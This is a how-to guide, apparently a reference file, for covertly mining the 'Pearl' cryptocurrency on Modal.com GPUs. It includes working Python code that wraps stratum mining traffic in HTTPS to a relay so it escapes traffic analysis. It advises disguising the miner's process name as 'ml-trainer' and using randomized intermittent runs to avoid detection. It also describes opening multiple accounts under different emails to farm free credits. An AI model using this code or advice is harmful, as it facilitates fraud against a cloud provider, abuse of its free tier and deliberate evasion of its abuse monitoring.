# Modal.com Setup for Mining

Modal.com is a serverless GPU platform with aggressive mining detection. This guide covers deployment patterns that maximize stealth.

## Prerequisites

1. **Modal account** — signup at https://modal.com (free $30 credit)
2. **Pearl wallet address** — starts with `prl1p...` (from https://pearl.alphapool.tech/downloads/pearl-wallet)
3. **Relay server running** — see `references/relay_implementations.md`
4. **Modal CLI** — `pip install modal`

## Setup Modal

```bash
# Install Modal Python SDK
pip install modal

# Authenticate
modal setup
# Opens browser, login, returns token

# Verify
modal token list
```

---

## Architecture on Modal

```
Modal Container
├── alpha-miner (binary)
├── stratum_wrapper.py (local proxy)
└── modal_entrypoint.py (orchestration)

Flow:
1. Container starts → launch wrapper (listens localhost:5566)
2. Wrapper wraps stratum → HTTPS to your relay
3. Launch alpha-miner → connects localhost:5566
4. Miner thinks localhost is pool, wrapper forwards
```

**Modal traffic analysis sees:** HTTPS requests to your relay domain  
**Pool sees:** Normal stratum miner

---

## Component 1: Stratum Wrapper (In Container)

Save as `stratum_wrapper.py` (deploys with container):

```python
#!/usr/bin/env python3
"""
Stratum → HTTPS wrapper for cloud GPU mining.
Runs inside Modal container, converts stratum to HTTPS.
"""
import socket
import requests
import json
import threading
import time
import sys

class StratumWrapper:
    def __init__(self, relay_url: str, listen_port: int = 5566):
        self.relay_url = relay_url.rstrip('/')
        self.listen_port = listen_port
        self.session = requests.Session()
        self.session_id = None
        
    def handle_client(self, client_sock: socket.socket):
        """Handle miner connection"""
        print(f"[WRAPPER] Miner connected")
        
        try:
            # Establish session with relay
            resp = self.session.post(f"{self.relay_url}/connect")
            self.session_id = resp.json()["session_id"]
            print(f"[WRAPPER] Relay session: {self.session_id}")
            
            # Start receiver thread (pool → miner)
            threading.Thread(
                target=self._receive_from_relay,
                args=(client_sock,),
                daemon=True
            ).start()
            
            # Forward miner messages to relay (miner → pool)
            while True:
                data = client_sock.recv(4096)
                if not data:
                    break
                
                # Send to relay via HTTPS
                resp = self.session.post(
                    f"{self.relay_url}/forward",
                    json={
                        "session_id": self.session_id,
                        "data": data.decode('utf-8', errors='ignore')
                    }
                )
                
        except Exception as e:
            print(f"[WRAPPER] Error: {e}")
        finally:
            client_sock.close()
            if self.session_id:
                self.session.post(
                    f"{self.relay_url}/disconnect",
                    json={"session_id": self.session_id}
                )
    
    def _receive_from_relay(self, client_sock: socket.socket):
        """Poll relay for pool responses"""
        while True:
            try:
                resp = self.session.post(
                    f"{self.relay_url}/poll",
                    json={"session_id": self.session_id},
                    timeout=30
                )
                if resp.status_code == 200:
                    data = resp.json().get("data")
                    if data:
                        client_sock.sendall(data.encode())
                time.sleep(0.1)
            except Exception as e:
                print(f"[WRAPPER] Receive error: {e}")
                break
    
    def start(self):
        """Start wrapper server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", self.listen_port))
        server.listen(1)
        
        print(f"[WRAPPER] Listening on 127.0.0.1:{self.listen_port}")
        
        while True:
            client, _ = server.accept()
            threading.Thread(
                target=self.handle_client,
                args=(client,),
                daemon=True
            ).start()

if __name__ == "__main__":
    relay_url = sys.argv[1] if len(sys.argv) > 1 else "https://relay.yourdomain.com"
    wrapper = StratumWrapper(relay_url)
    wrapper.start()
```

---

## Component 2: Modal Deployment Script

Save as `modal_pearl_miner.py`:

```python
import modal
import os

# Modal app
app = modal.App("pearl-mining")

# Container image with alpha-miner + wrapper
image = (
    modal.Image.debian_slim()
    .apt_install("curl", "python3", "python3-requests")
    .run_commands(
        # Download alpha-miner
        "curl -L -o /usr/local/bin/alpha-miner https://pearl.alphapool.tech/downloads/alpha-miner",
        "chmod +x /usr/local/bin/alpha-miner"
    )
    .copy_local_file("stratum_wrapper.py", "/root/stratum_wrapper.py")
)

@app.function(
    gpu="a100",  # Or: "h100", "l4"
    timeout=86400,  # 24 hours
    image=image,
    secrets=[modal.Secret.from_name("pearl-mining-config")]
)
def mine():
    import subprocess
    import time
    
    # Get config from Modal secrets
    relay_url = os.environ["RELAY_URL"]
    wallet_address = os.environ["WALLET_ADDRESS"]
    worker_name = os.environ.get("WORKER_NAME", "modal-01")
    
    print(f"[MODAL] Starting mining worker: {worker_name}")
    print(f"[MODAL] Relay: {relay_url}")
    print(f"[MODAL] Wallet: {wallet_address[:10]}...")
    
    # Start stratum wrapper (background)
    wrapper = subprocess.Popen(
        ["python3", "/root/stratum_wrapper.py", relay_url],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    
    # Wait for wrapper to start
    time.sleep(3)
    print("[MODAL] Wrapper started")
    
    # Start alpha-miner (connects to localhost wrapper)
    miner = subprocess.Popen(
        [
            "/usr/local/bin/alpha-miner",
            "--pool", "stratum+tcp://127.0.0.1:5566",
            "--address", wallet_address,
            "--worker", worker_name,
            "--password", "x;d=131072"  # A100 difficulty
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    
    print("[MODAL] Miner started")
    
    # Monitor both processes
    try:
        while True:
            # Check if processes alive
            if wrapper.poll() is not None:
                print("[MODAL] Wrapper died, restarting...")
                # (add restart logic)
            
            if miner.poll() is not None:
                print("[MODAL] Miner died, restarting...")
                # (add restart logic)
            
            time.sleep(30)
            
    except KeyboardInterrupt:
        print("[MODAL] Stopping...")
        miner.terminate()
        wrapper.terminate()

# Deploy function (call this to start mining)
@app.local_entrypoint()
def main():
    print("Deploying mining worker to Modal...")
    mine.remote()
```

---

## Step 3: Configure Modal Secrets

Modal secrets = environment variables for deployed functions.

```bash
# Create secret with your config
modal secret create pearl-mining-config \
  RELAY_URL=https://relay.yourdomain.com \
  WALLET_ADDRESS=prl1pYOUR_WALLET_ADDRESS \
  WORKER_NAME=modal-worker-01
```

---

## Step 4: Deploy & Run

```bash
# Deploy to Modal
modal deploy modal_pearl_miner.py

# Or run immediately (foreground)
modal run modal_pearl_miner.py

# Check logs
modal app logs pearl-mining
```

**Expected output:**
```
[MODAL] Starting mining worker: modal-worker-01
[MODAL] Relay: https://relay.yourdomain.com
[MODAL] Wallet: prl1p...
[WRAPPER] Listening on 127.0.0.1:5566
[WRAPPER] Miner connected
[WRAPPER] Relay session: abc123
[MINER] Connected to pool
[MINER] Share accepted
```

---

## Monitoring

**Modal dashboard:** https://modal.com/apps  
**Alphapool dashboard:** https://pearl.alphapool.tech (paste wallet address)

**Check status:**
```bash
# List running functions
modal app list

# View logs
modal app logs pearl-mining --follow

# Stop mining
modal app stop pearl-mining
```

---

## Multi-GPU / Scale Up

### Option A: Single Container, Multiple GPUs
```python
@app.function(
    gpu=modal.gpu.A100(count=2),  # 2x A100
    # ...
)
```

### Option B: Multiple Containers
```python
# Deploy 5 separate workers
for i in range(5):
    mine.spawn(worker_id=i)
```

### Option C: Multiple Modal Accounts
- Create 5 Modal accounts (use different emails)
- Deploy same script to each
- Each gets $30 free credit = 12 hours A100 each = 60 hours total

---

## Detection Risk Mitigation

**Modal monitors:**
1. Network traffic patterns
2. GPU utilization (100% sustained)
3. Process names
4. Container lifetime (24/7 = suspicious)

**Mitigations:**
1. ✅ **Traffic wrapped** (HTTPS to relay, not stratum)
2. ⚠️ **Process name** — alpha-miner is obvious
   - Rename binary: `mv alpha-miner ml-trainer` before deploy
3. ⚠️ **Lifetime** — 24 hours straight is red flag
   - Add intermittent pattern (see below)

### Intermittent Mining Pattern
```python
import time
import random

while True:
    # Mine 40 minutes
    miner = subprocess.Popen([...])
    time.sleep(40 * 60)
    miner.terminate()
    
    # Sleep 15-25 minutes (random)
    sleep_time = random.randint(15, 25) * 60
    time.sleep(sleep_time)
```

---

## Troubleshooting

**"Function timeout after 1 hour"**
- Cause: Default timeout is 3600s
- Fix: Set `timeout=86400` in `@app.function()`

**"GPU not available"**
- Cause: Modal capacity full
- Fix: Try different GPU (`l4` instead of `a100`), or different region

**"Wrapper connection refused"**
- Cause: Wrapper not started before miner
- Fix: Increase `time.sleep(3)` to `time.sleep(5)`

**"No shares accepted"**
- Cause: Relay not forwarding correctly
- Fix: Test relay separately (see relay_implementations.md)

**"Account suspended"**
- Cause: Mining detected
- Fix: Check logs for detection signals, try different stealth level

---

## Expected Lifespan

**Modal free tier:** 24-48 hours before detection (HIGH risk platform)  
**Modal paid account:** Slightly longer, but still high risk

**Recommendation:** Treat Modal as disposable test platform. Use Vast.ai/RunPod for production.

---

## Economics (Modal A100)

**Cost:** $2.50/hour = $60/day  
**Free credit:** $30 = 12 hours runtime  
**After credit:** Need >$60/day revenue to profit

**Calculate before deploying:**
```
Daily profit = (Pearl price × A100 hashrate × 24h) - $60
```

Check current profitability: https://pearl.alphapool.tech/calculator

---

## Next: See `references/runpod_setup.md` for lower-risk alternative
